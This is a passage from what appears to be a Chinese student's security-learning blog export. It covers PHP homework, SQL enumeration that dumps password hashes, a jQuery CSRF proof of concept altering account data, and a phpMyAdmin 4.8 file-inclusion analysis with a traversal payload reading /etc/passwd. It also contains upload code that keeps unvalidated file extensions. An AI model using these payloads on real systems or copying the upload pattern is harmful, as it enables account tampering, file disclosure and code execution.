base64_encode(htmlspecialchars($_POST[&quot;biaoti&quot;]));$zuozhe = base64_encode($_SESSION[&apos;username&apos;]);$time = time(); //时间戳$shijian = base64_encode(date( &apos;Y-m-d H:i:s&apos;, $time)); //生成带格式的日期//上传文件部分$name = explode(&apos;.&apos;,$_FILES[&apos;Filedata&apos;][&apos;name&apos;]); //取出上传文件的后缀var_dump($_FILES[&apos;Filedata&apos;][&apos;name&apos;]);$houzhui = &apos;.&apos;.end($name);//将后缀和.合起来，变成.xxxvar_dump($houzhui);$wjm = $_SESSION[&apos;username&apos;].time().$houzhui;//生成一个文件名:登录名+时间戳+后缀$lujing = &quot;../data/xinwenwenjian/&quot;.$wjm; //将路径和文件名合并在一起。生成保存路径move_uploaded_file($_FILES[&apos;Filedata&apos;][&apos;tmp_name&apos;],$lujing);//将文件从临时文件转移到自己定义的路径中$lujing = base64_encode(&quot;&#123;$lujing&#125;&quot;);$jianjie = base64_encode(htmlspecialchars($_POST[&quot;jianjie&quot;]));$qwe = &quot;$redu|$biaoti|$zuozhe|$shijian|$lujing|$jianjie&quot;.&quot;\\n&quot;;$f = fopen(&quot;../data/xinwenwenjian/new.db&quot;,&quot;a+&quot;);fwrite($f,$qwe);echo &quot;&lt;script&gt;alert(&apos;新闻上传成功&apos;);location.href=&apos;zengjiaxinwen.php&apos;;&lt;/script&gt;&quot;;?&gt; 点击显示更多新闻123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpRequire_once '../basedir/header.php';?&gt;&lt;?php$action = $_GET['action'];?&gt;&lt;div style=\"width:100%;text-align:center\"&gt; &lt;h1&gt;新闻详情&lt;/h1&gt;&lt;/div&gt;&lt;hr&gt;&lt;table align=\"center\" width=\"600\"&gt; &lt;tr &gt;&lt;th id=\"xwjm\"&gt;&lt;a href=\"index.php\"&gt;新闻界面&lt;/th&gt;&lt;/table&gt;&lt;?php$f = fopen('../data/xinwenwenjian/new.db','r');while (!feof($f))&#123; $str = fgets($f); $shuzu = explode(\"|\",$str); if(count($shuzu) !=6)&#123; continue; &#125; $shuzu = explode('|',$str);//按照|进行分割 if(trim(base64_decode($shuzu[1])) == $action)&#123; $biaoti = base64_decode($shuzu[1]); $jianjie= base64_decode($shuzu[5]); echo &lt;&lt;&lt;EOF &lt;table align=\"center\"&gt; &lt;tr&gt; &lt;td align=\"center\"&gt;&lt;h2&gt;&#123;$biaoti&#125;&lt;/h2&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=\"3\" align=\"center\" &gt;&lt;h3&gt;&#123;$jianjie&#125;&lt;/h3&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; EOF; &#125;&#125;?&gt;&lt;?phpRequire_once '../basedir/footer.php';?&gt;","categories":[],"tags":[]},{"title":"8.12作业","slug":"8.12","date":"2019-08-12T09:46:20.580Z","updated":"2019-08-12T15:20:29.773Z","comments":true,"path":"2019/08/12/8.12/","link":"","permalink":"https://0xxk.github.io/2019/08/12/8.12/","excerpt":"放在了ceshi数据库里","text":"放在了ceshi数据库里 123456789通过查找TABLES中数据库属于ceshi的表明，来找到对应的表名select * from information_schema.TABLES where TABLE_SCHEMA=&apos;ceshi&apos;; select table_nAME from information_schema.TABLES where TABLE_SCHEMA=&apos;ceshi&apos;;+------------+| TABLE_NAME |+------------+| content || users |+------------+ 通过查找columns中表属于content表的字段，来找到对应content表的字段名 123456789101112mysql&gt; select * from information_schema.COLUMNS where TABLE_NAME=&apos;content&apos;;+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME | COLUMN_TYPE | COLUMN_KEY | EXTRA | PRIVILEGES | COLUMN_COMMENT | GENERATION_EXPRESSION | SRS_ID |+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+| def | ceshi | content | id | 1 | NULL | NO | int | NULL | NULL | 10 | 0 | NULL | NULL | NULL | int(10) unsigned | PRI | auto_increment | select,insert,update,references | | | NULL || def | ceshi | content | title | 2 | NULL | NO | varchar | 100 | 300 | NULL | NULL | NULL | utf8 | utf8_general_ci | varchar(100) | | | select,insert,update,references | | | NULL || def | ceshi | content | author | 3 | NULL | NO | varchar | 40 | 120 | NULL | NULL | NULL | utf8 | utf8_general_ci | varchar(40) | | | select,insert,update,references | | | NULL || def | ceshi | content | value | 4 | NULL | NO | text | 65535 | 65535 | NULL | NULL | NULL | utf8 | utf8_general_ci | text | | | select,insert,update,references | | | NULL || def | ceshi | content | time | 5 | NULL | NO | varchar | 40 | 120 | NULL | NULL | NULL | utf8 | utf8_general_ci | varchar(40) | | | select,insert,update,references | | | NULL || def | ceshi | content | ip | 6 | NULL | NO | varchar | 40 | 120 | NULL | NULL | NULL | utf8 | utf8_general_ci | varchar(40) | | | select,insert,update,references | | | NULL |+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+6 rows in set (0.00 sec) 通过查找columns中表属于users表的字段，来找到对应users表的字段名 123456789101112131415mysql&gt; select * from information_schema.COLUMNS where TABLE_NAME=&apos;users&apos;;或将 * 换成column_name+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME | COLUMN_TYPE | COLUMN_KEY | EXTRA | PRIVILEGES | COLUMN_COMMENT | GENERATION_EXPRESSION | SRS_ID |+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+| def | ceshi | users | id | 1 | NULL | NO | int | NULL | NULL | 10 | 0 | NULL | NULL | NULL | int(10) unsigned | PRI | auto_increment | select,insert,update,references | | | NULL || def | ceshi | users | username | 2 | NULL | NO | varchar | 20 | 60 | NULL | NULL | NULL | utf8 | utf8_general_ci | varchar(20) | UNI | | select,insert,update,references | | | NULL || def | ceshi | users | passwd | 3 | NULL | NO | varchar | 100 | 300 | NULL | NULL | NULL | utf8 | utf8_general_ci | varchar(100) | | | select,insert,update,references | | | NULL || def | ceshi | users | user_ip | 4 | NULL | NO | varchar | 20 | 60 | NULL | NULL | NULL | utf8 | utf8_general_ci | varchar(20) | | | select,insert,update,references | | | NULL || def | ceshi | users | join_date | 5 | NULL | NO | varchar | 40 | 120 | NULL | NULL | NULL | utf8 | utf8_general_ci | varchar(40) | | | select,insert,update,references | | | NULL || def | performance_schema | users | USER | 1 | NULL | YES | char | 32 | 128 | NULL | NULL | NULL | utf8mb4 | utf8mb4_bin | char(32) | UNI | | select,insert,update,references | | | NULL || def | performance_schema | users | CURRENT_CONNECTIONS | 2 | NULL | NO | bigint | NULL | NULL | 19 | 0 | NULL | NULL | NULL | bigint(20) | | | select,insert,update,references | | | NULL || def | performance_schema | users | TOTAL_CONNECTIONS | 3 | NULL | NO | bigint | NULL | NULL | 19 | 0 | NULL | NULL | NULL | bigint(20) | | | select,insert,update,references | | | NULL |+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+8 rows in set (0.00 sec) 在这里总结出content表和users表分别拥有的字段 12content: id title author value time ipusers: id username passwd user_ip join_date 最后依次通过查询各表中的字段来读取数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111mysql&gt; select id from ceshi.content ;+----+| id |+----+| 1 || 2 || 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11 || 12 || 13 || 14 || 15 || 16 || 17 || 18 || 19 || 20 |+----+mysql&gt; select title from ceshi.content ;+------------+| title |+------------+| mmmn || zzzzsadfas || asfwefas || qqq || qqq || asdfas || zzzsafd || wqeras || asfasdf || poikj || efadsfa || || pdo || testtitle || sad || 16161616 || 17 || adasf || awawaw || sdaf |+------------+mysql&gt; select author from ceshi.content ;+------------+| author |+------------+| nbnbn || fasdfwf || adsfasf || aaa || aaa || dasfaa || sadfasdf || asdf || asdfas || htjg || asdfasfd || || sdasd || sdfa || dsda || 1616161616 || 17 || asfasdf || sdafasf || asdfasfd |+------------+20 rows in set (0.00 sec)mysql&gt; select id from ceshi.users ;+----+| id |+----+| 1 || 8 || 9 || 10 |+----+4 rows in set (0.00 sec)mysql&gt; select username from ceshi.users ;+----------+| username |+----------+| admin || booom || sadfasdf || zfzv |+----------+4 rows in set (0.00 sec)mysql&gt; select passwd from ceshi.users;+----------------------------------+| passwd |+----------------------------------+| e10adc3949ba59abbe56e057f20f883e || 156756811d9c56c11ebccdef355bf4e0 || a6be11c879133def33fdb767be80056f || f95adbce0a51589cb6e87112eb6becd4 |+----------------------------------+4 rows in set (0.00 sec) 依此类推","categories":[],"tags":[]},{"title":"DOM与BOM的异同","slug":"DOM和BOM","date":"2019-08-11T14:49:49.784Z","updated":"2019-08-01T16:03:45.509Z","comments":true,"path":"2019/08/11/DOM和BOM/","link":"","permalink":"https://0xxk.github.io/2019/08/11/DOM和BOM/","excerpt":"​ DOM操作页面，BOM操作浏览器。听到这句话时，我感觉自己的基础不是很扎实。脑海里复现的问题竟然是DOM是什么？BOM是什么？","text":"​ DOM操作页面，BOM操作浏览器。听到这句话时，我感觉自己的基础不是很扎实。脑海里复现的问题竟然是DOM是什么？BOM是什么？ 为什么COM能操作页面？为什么BOM能操作浏览器？他们之间有什么共同点？有什么不同点呢？既然问题出来了，那我们就一一百度解决！ DOM是什么？​ DOM全称Document Object Model，即文档对象模型。我理解的DOM是一个接口，它接在HTML代码中。就像document.getElementById(‘xxx’)一样，它把Id为“myBtn”的节点“引用”到了这里。就相当于API接口，这样用脚本（JS）控制Web界面就很方便。（观点浅薄，请自行深入） BOM是什么？​ BOM全称Browser Object Model，即浏览器对象模型。它也是接口，它的口接在全局对象中。也就是可以网页中，我们可以通过BOM接口加上一些动作来对浏览器进行控制。 为什么COM能操作页面？为什么BOM能操作浏览器？​ 因为它们都是各自对象模型的接口（分别对应：文档对象模型，浏览器对象模型）。就像一个是手机的屏幕，一个是汽车的方向盘。都能都过对应的那一个点去操控各自的模型。 他们之间有什么共同点？有什么不同点呢？浅谈 不同点：各自操作不同的模型。 相同点：你中有我，我中有你。 深论 javascript由三部分组成：ECMAScript,DOM,BOM组成。 123DOM是W3C的标准；[所有浏览器公共遵守的标准]BOM是各个浏览器厂商根据DOM在各自浏览器上的实现;[表现为不同浏览器定义有差别，实现方式不同]window是BOM对象，而非js对象。 ​ DOM（文档对象模型）是HTML和XML的应用程序接口（API）。​ BOM主要处理浏览器窗口和框架，不过通常浏览器特定的JavaScript扩展都被看做BOM的一部分。这些扩展包括： 123456弹出新的浏览器窗口移动、关闭浏览器窗口以及调整窗口大小提供web浏览器详细信息的定位对象提供用户品目分辨率详细信息的屏幕对象对cookie的支持IE扩展了BOM，加入了ActiveXObject类，可以通过JavaScript实例化Activex对象 ​ javascript是通过访问BOM对象来访问、控制、修改客户端（浏览器），由于BOM的window包含了document,window对象的属性和方法是直接可以使用而且被感知的，因此可以直接使用winodw对象的document属性。 ​ 通过document属性就可以访问、检索、修改XHTML文档内容与结构。因为document对象又是DOM模型的根节点。可以说，BOM包含了DOM(对象)，浏览器提供出来给予访问的是BOM对象，从BOM对象再访问到DOM对象，从而js可以操作浏览器以及浏览器读取到的文档。其中DOM包含:window 分类 window对象包含属性：document、location、navigater、screen、history、frames。 Document根节点包含子节点：forms、location、anchors、images、links 从window.document已然可以看出，DOM最根本的对象是BOM window对象的子对象。 参考链接：https://blog.csdn.net/xiao_tommy/article/details/53231165","categories":[{"name":"编程","slug":"编程","permalink":"https://0xxk.github.io/categories/编程/"}],"tags":[]},{"title":"CSRF JQ POST提交","slug":"CSRF JQ POST提交","date":"2019-08-11T14:49:49.780Z","updated":"2019-08-04T16:23:40.719Z","comments":true,"path":"2019/08/11/CSRF JQ POST提交/","link":"","permalink":"https://0xxk.github.io/2019/08/11/CSRF JQ POST提交/","excerpt":"​ 在温习完前端后，继续学习了JS JQ。在讲JQ时，讲师用JQ本地复现了一遍CSRF。因为我对CSRF的理解一直处于概念上，所以就此机会将JQ复现代码学习理解一遍！","text":"​ 在温习完前端后，继续学习了JS JQ。在讲JQ时，讲师用JQ本地复现了一遍CSRF。因为我对CSRF的理解一直处于概念上，所以就此机会将JQ复现代码学习理解一遍！ 某小游戏网csrf POST更改账户信息。代码具体如下： 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jquery&lt;/title&gt; &lt;script src=\"https://libs.baidu.com/jquery/2.0.0/jquery.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; $.ajax(&#123; type: 'POST', url:'http://www.xxxx.com/xxxapi/user/info', dataType: 'json', data: &#123; \"headimg\":\"/static/usericon/userphoto20.png\", \"user_tag\":[], \"allow_status\":\"1\", \"nickname\":\"Leafer\", \"real_name\":\"\", \"id_number\":\"\"&#125;, xhrFields: &#123; withCredentials:true //支持附带详细信息,可以携带cookie &#125;, crossDomain: true,//请求偏向外域,支持跨域请求 success: function (data) &#123; console.log(data); &#125; &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 本例 type为’POST’。type默认值为”GET”，可选”GET”或”POST”。 url为发送请求的地址。 dataType为传递的数据类型。本处为”JSON”。可用值如下： “xml”:返回XML文档； “html”:返回纯文本HTML信息； “script”:返回纯文本JavaScript代码。 “json”:返回JSON数据 “jsconp”:JSONP格式 “text”:返回纯文本字符串。 xhrFields: {withCredentials:true}支持附带详细信息,携带cookie crossDomain:ture 请求偏向外语，支持跨域请求 success: function (data) {console.log(data);}请求成功后在控制台输出data数据。 访问页面后 参数为： 响应值为： 再去查看自己的昵称","categories":[],"tags":[]},{"title":"作业","slug":"作业","date":"2019-08-11T14:49:49.777Z","updated":"2019-08-11T12:30:58.494Z","comments":true,"path":"2019/08/11/作业/","link":"","permalink":"https://0xxk.github.io/2019/08/11/作业/","excerpt":"这是一份作业","text":"这是一份作业 素数 1234567891011121314&lt;?phpfor($l=2;$l&lt;100;$l++)&#123; $M = $l; $f=1; for($i=2;$i&lt;$M;$i++) if($M % $i == 0)&#123; $f = 0; break; &#125; if ($f==1)&#123; echo $M.\"\\n\"; &#125;&#125; 五角星 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpecho &quot;\\n\\n&quot;;for ( $i1 = 1; $i1 &lt; 6; $i1++ ) /*这是五角星的上面一个角*/&#123; for ( $j1 = 1; $j1 &lt; 19 - $i1; $j1++ ) printf( &quot; &quot; ); for ( $k1 = 1; $k1 &lt;= 2 * $i1 - 1; $k1++ ) printf( &quot;*&quot; ); printf( &quot;\\n&quot; );&#125;for ($i2 = 1; $i2 &lt; 5; $i2++ ) /*这是五角星的中间两个角*/&#123; for ( $j2 = 1; $j2 &lt; 3 * $i2 - 3; $j2++ ) printf( &quot; &quot; ); for ( $k2 = 1; $k2 &lt;= 42 - 6 * $i2; $k2++ ) printf( &quot;*&quot; ); printf( &quot;\\n&quot; );&#125;for ( $i3 = 1; $i3 &lt; 3; $i3++ ) /*这是中间与下部相接的部分*/&#123; for ( $j3 = 1; $j3 &lt; 12 - $i3; $j3++ ) printf( &quot; &quot; ); for ( $k3 = 1; $k3 &lt;= 12 + 2 * $i3; $k3++ ) printf( &quot;*&quot; ); printf( &quot;\\n&quot; );&#125;for ( $i4 = 1; $i4 &lt; 5; $i4++ ) /*这是五角星的下面两个角*/&#123; for ( $j4 = 1; $j4 &lt; 10 - $i4; $j4++ ) printf( &quot; &quot; ); for ( $k4 = 1; $k4 &lt;= 10 - 2 * $i4; $k4++ ) printf( &quot;*&quot; ); for ( $m4 = 1; $m4 &lt; 6 * $i4 - 3; $m4++ ) printf( &quot; &quot; ); for ( $n4 = 1; $n4 &lt;= 10 - 2 * $i4; $n4++ ) printf( &quot;*&quot; ); printf( &quot;\\n&quot; );&#125;?&gt; 循环输出关联数组 12345&lt;?php$shuzu = array( &apos;xm&apos; =&gt; &apos;zhiwei&apos;, &apos;ming&apos; =&gt; &apos;zhiwei&apos;, &apos;aaa&apos; =&gt; &apos;6666&apos;);$jian = array_keys($shuzu);echo $jian[1];for($i=0;$i&lt;count($jian);$i++)&#123; echo $jian[$i].&quot;\\n&quot;;&#125;?&gt; 新闻界面 显示界面 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?php&lt;!--先输出每列标题--&gt;&lt;!--再打开txt--&gt;&lt;!--读取出数据后，使用函数进行分割。--&gt;&lt;!--将分割完的存入数组--&gt;&lt;!--再将数组中的数据，按照格式每行输出。--&gt;&lt;!--列标题： 热度 标题 作者 发表时间 操作--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;&lt;?php echo &apos;ICQ新闻震撼部&apos;;?&gt;&lt;/title&gt;&lt;/head&gt;&lt;body background=&quot;tupian/bg.jpg&quot;&gt;&lt;center&gt;&lt;?php echo &quot;ICQ新闻震撼部&quot;;?&gt;&lt;/center&gt;----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;table&gt; &lt;tr&gt; &lt;th&gt;&lt;button&gt;&lt;?php echo &quot;热度✍&quot;; ?&gt;&lt;/button&gt;&lt;/th&gt; &lt;th&gt;&lt;?php echo &quot;标题&quot;; ?&gt;&lt;/th&gt; &lt;th&gt;&lt;?php echo &quot;作者&quot;; ?&gt;&lt;/th&gt; &lt;th&gt;&lt;?php echo &quot;发表时间&quot;; ?&gt;&lt;/th&gt; &lt;th&gt;&lt;?php echo &quot;操作&quot;; ?&gt;&lt;/th&gt; &lt;/tr&gt; &lt;?php $f = fopen(&quot;news.db&quot;,&quot;r&quot;); $i=0; while(!feof($f))&#123; $hang = fgets($f); $shuzu = explode(&quot;|&quot;,$hang); $redu = base64_decode($shuzu[0]); $biaoti = base64_decode($shuzu[1]); $zuozhe = base64_decode($shuzu[2]); $fashijian = base64_decode($shuzu[3]); $caozuo = base64_decode($shuzu[4]); $tupian = base64_decode($shuzu[5]); $jianjie = substr(base64_decode($shuzu[6]),&quot;0&quot;,&quot;400&quot;); echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td align=&quot;center&quot;&gt;$redu&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;$biaoti&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;$zuozhe&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;$fashijian&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;$caozuo&lt;/td&gt; &lt;/tr&gt;EOF; if($i&lt;3)&#123; echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td&gt;$tupian&lt;/td&gt; &lt;td colspan=&quot;4&quot;&gt;$jianjie&lt;/tr&gt;EOF; $i++; &#125; &#125; ?&gt;&lt;/table&gt;----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;center&gt;版权所有 ICQ&lt;/center&gt;&lt;center&gt;©2019 ICQ 意见反馈 京ICP证030173号 京公网安备11000002000001号 &lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 上传前端 123456&lt;form action=\"jieshou.php\" method=\"POST\" accept-charset=\"utf-8\" enctype=\"multipart/form-data\"&gt; &lt;div class=\"lsUpfindBtn\"&gt;上传图片 &lt;input type=\"file\" name=\"file\" id=\"file\" /&gt; &lt;/div&gt; &lt;input type=\"submit\" value=\"点击上传\"&gt;&lt;/form&gt;&lt;/body&gt; 上传后端 12345$file = request()-&gt;file(&apos;file&apos;);$info = $file-&gt;move(ROOT_PATH.&apos;F:\\Project\\PHP\\test\\news_file\\tupian&apos;);//图片保存路径 //储存到数据库if(!$info)&#123; $this-&gt;error(&apos;图片上传失败&apos;);&#125;","categories":[],"tags":[]},{"title":"phpMyAdmin4.8文件包含漏洞","slug":"test","date":"2019-08-11T14:49:49.771Z","updated":"2019-07-28T08:57:33.796Z","comments":true,"path":"2019/08/11/test/","link":"","permalink":"https://0xxk.github.io/2019/08/11/test/","excerpt":"首先来说下文件包含是什么，粗俗的讲就是本网页包含其他源代码来执行。此处本意正如编程中的函数调用，重复的代码大可不写。合理调用利用重复代码才是王道。","text":"首先来说下文件包含是什么，粗俗的讲就是本网页包含其他源代码来执行。此处本意正如编程中的函数调用，重复的代码大可不写。合理调用利用重复代码才是王道。 那么文件包含漏洞是什么呢？文件包含不该是正常网站的一个功能吗？用尘哥的话说就是xx程序员多了，就有了漏洞，就有了安全这行业。本来应该包含正确代码到文件中去执行的，但是在包含这个地方没有做好过滤。导致我们能让网站随我们心意“任意”执行我们想要做的“事情”。 在phpMyadmin4.0 4.1中就有这么一处包含的位置过滤不严导致可控。我们通过文件包含去调用我们“上传”到网站上的恶意代码，如：一句话木马。只要将其包含就可以“执行”。让我们先来认识下PHP中文件包含的函数： include() 使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行整个php文件。 include_once() 这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下改文件是否被导入。如果已经执行一遍那么就不重复执行了。 require() 使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。 require_once() 功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 先让我们大致的浏览的一下phpMyadmin网站的结构。既然说是文件包含，那么漏洞点必然在包含的位置那。大致浏览了一波，好像没有找到明显的?xxx=xx.php这种页面。那么直接上手源代码吧，提示漏洞出在index.php中。让我们依次去查找文件包含的关键字： include() 搜索全文后发现只有这四个地方用到了包含include函数. include_once() 就只有一处 require 就只有这一处 Require_once 也只有这么一处。因为我们需要被包含文件位置可变（目前非可控）。所以除去所有相对路径后只剩下include中的两处了。分别是： 先让我们来分析下include $page的条件（哦吼，php学的烂看不懂。让我百度一波） $page中的数值会在函数中判断后由Utile类getScriptNameForOption函数返回值赋予。继续溯源到Util::getScriptNameForOption中去。 查看Util.php源代码，定位到3064行——3110行。代码分别如下 总的看了下它共有三个判断语句，如果传入的$location等于server、database、table中的一个。那么就进行swith($target)选择一个值return返回。由此可见，这个包含的地方不是漏洞点。现在只剩下include $_REQUEST[‘target’];了。 首先对涉及到的函数进行百度（菜是原罪） 1.empty:若变量已存在、非空字符串或者非零，则返回false值，反之返回true。 2.is_string:检测变量是否是字符串，如果是字符串返回TURE，反则返回FALSE。 3.preg_match:用于执行一个正则表达式匹配 4.in_array:搜索数组中是否存在指定的值。 5.将target传去Core类的checkPageValidity进行判断。 如果以上五项都为True，则执行下面的include $_REQUEST[‘target’]; 让我们依次来分析各项为True的条件。 empty()：要让后面的’target’存在或者是空字符串或者非零。这样empty返回0，和前面的！非一下就成了1. is_string：target的数值要为字符串。 preg_match:如果target满足正则条件则返回1。target字符串的头不能为index，否则！1就返回0。 in_array:target中的值不能出现在$target_blacklist中。$target_blacklist中有’import.php’和’export.php’。只要’target’中的值不包含’import.php’和’export.php’就可以了 Core::checkPageValidity：将’target’的值传入core类的checkPageValidity函数中去进行判断。如果返回的数值为True，那么就为1。对Core::checkPageValidity进行溯源： 进入Core.php，定位checkPageValidity函数进行判断。 大致查看下有哪些判断条件，共有五个判断语句。如下逐个分析： 在这个if中，因为我们没有给whitelist传送一个值过来，所以导致这里empty($whitelist)为True。转而执行下面的$whitelist = self::$goto_whitelist;在slfe::$goto_whitelist中存放着白名单。这里将白名单赋予给$whitelist变量。 goto_whitelist白名单如下（部分）： 在这里变量page也就是传入的target要被定义过或是字符串，否则返回false。 我们传入的变量如果是白名单里的一种，那么就返回true。 5.这里用到了mb_substr函数和mb_strpos函数。mb_substr的作用是返回字符串的一部分。mb_strpos这里是判断后面字符出现的位置。这里总的含义就是将变量page里出现在?号前面的数据截取后传入$_page。如下举例： 在这里我曾有一个zz的地方，知道mb_strpos函数的作用后不免思考：为什么要加上一个？号后再判断它位置来截断呢？毫无意思的操作，自己加然后截断自己的参数。从而导致我觉得.号作用不是拼接而有其他意思。后来如上图试验后才明白函数原来是从左往后去判断截断的。如果在用户输入有?的前提下将文件名和参数分开，没有?时也可以取出文件名。 但是在这里有一个问题，正如我们上面使用的语句：db_sql.php?/../../../../../../etc/passwd。它虽然绕过了之前所有的过滤，但是在php中问号后面的是会被当作参数来执行的。那还是达不到包含文件的作用的！继续来看下面的参数！ 5.在这里有一个很有趣的地方，那就是urldecode()。他的作用是将url编码解码一次，那么在这里就很有意思了！ 它将解码后的在拿去判断，这是无用的！因为php最后包含的是解码之前的代码！如下所示： 文件包含的是db_sql.php%3f/../../../../../../etc/passwd，可解码后判断的是db_sql.php?/../../../../../../etc/passwd这是不一样的。这这个if里我们顺利通过了关键字白名单判断且用正确格式包含了自己想要得到的数据。 综合上面所有的判定条件。我们要通过target参数传入一串字符串，字符串前面的文件名要在白名单中，且？要进行二次url编码（浏览器传送时会自动解码一次）。这样就可以绕过所有的过滤达到我们要的效果了。 如下所示： 因本人很菜，无法在默认配置下利用文件包含漏洞点去拿getshell。至此只写下如何查看phpinfo()。 一．通过数据库写入phpinfo()从而来包含。 再来查看当前数据库位置 具体目录根据保存规则推算。在这里tt.frm得允许其他人可读。 二．第二种方法就是网上常见得包含Php日志。 在这里不需要sess_sxxxx有读权限。因为文件本身的所有者就是apache。二第一种方法之所以要其他人读权限。是因为数据库本身的所有者是apache","categories":[],"tags":[]},{"title":"JS事件初识","slug":"JS事件","date":"2019-08-11T14:49:49.758Z","updated":"2019-07-31T16:34:54.482Z","comments":true,"path":"2019/08/11/JS事件/","link":"","permalink":"https://0xxk.github.io/2019/08/11/JS事件/","excerpt":"学习了JS后发现自己还有很多很多不会的东西。对于陌生的语言，从基础开始学习是非常有必要的。","text":"学习了JS后发现自己还有很多很多不会的东西。对于陌生的语言，从基础开始学习是非常有必要的。 但对于快速的课程而言，就此只针对课上出现过的事件进行学习!一.getElementById()方法 getElementById()方法可返回拥有指定ID的第一个对象的引用。 语法: 1document.getElementById(id) 举例： 1234567891011121314&lt;head&gt;&lt;script type=\"text/javascript\"&gt;function getValue()&#123;var x=document.getElementById(\"myHeader\")alert(x.innerHTML)&#125;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;h1 id=\"myHeader\" onclick=\"getValue()\"&gt;这是标题&lt;/h1&gt;&lt;p&gt;点击标题，会提示出它的值。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 可以看到代码里监听了”MyHeader”，当id为myHeafer的值被点击时，就触发后面的动作，也就是alert(x.innerHTML)，当我们点击时就触发了。 二.getElementById是引用他人再做出动作，但是下面的方法就有些不一样了。 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p id=\"demo\"&gt;单击按钮创建一个标题&lt;/p&gt;&lt;button onclick=\"myFunction()\"&gt;点我&lt;/button&gt;&lt;script&gt;function myFunction()&#123; var h=document.createElement(\"H1\"); var t=document.createTextNode(\"Hello World\"); h.appendChild(t); document.body.appendChild(h);&#125;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在上面的代码里用到了 1234document.getElementByid(\"myBtn\").addEventListener(\"click\",function()&#123;document.getElementByld(\"demo\").innerHTML = \"Hello World\"; &#125;); 这里的document.getElementByid(“myBtn”).addEventListerner 就不是引用id=myBtn的意思了。作用点在后面的addEventListerner，后面方法的作用是监听前面的id，当点击时满足条件从而去运行下面的函数。在这里有一个新的方法innerHTML。 innerHTML属性设置或返回表格行的开始和结束标签之间的HTML代码。 在这里的意思就是往前面id为demo的标签中间返回后面的“Hello World”代码。 这里代码的意思就是，当myBtn被点击时，则在demo标签的位置显示Hello World。 同理这里的”click”也可以改为”mousemove”，当移动到这个标签上时触发规则输出Hello World。 三.onclick事件在这里出现了新的句子。 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;script&gt;function myFunction()&#123; document.getElementById(\"demo\").innerHTML=\"Hello World\";&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;单击按钮触发函数。&lt;/p&gt;&lt;button onclick=\"myFunction()\"&gt;点我&lt;/button&gt;&lt;p id=\"demo\"&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 在这里出现了一个 1&lt;button 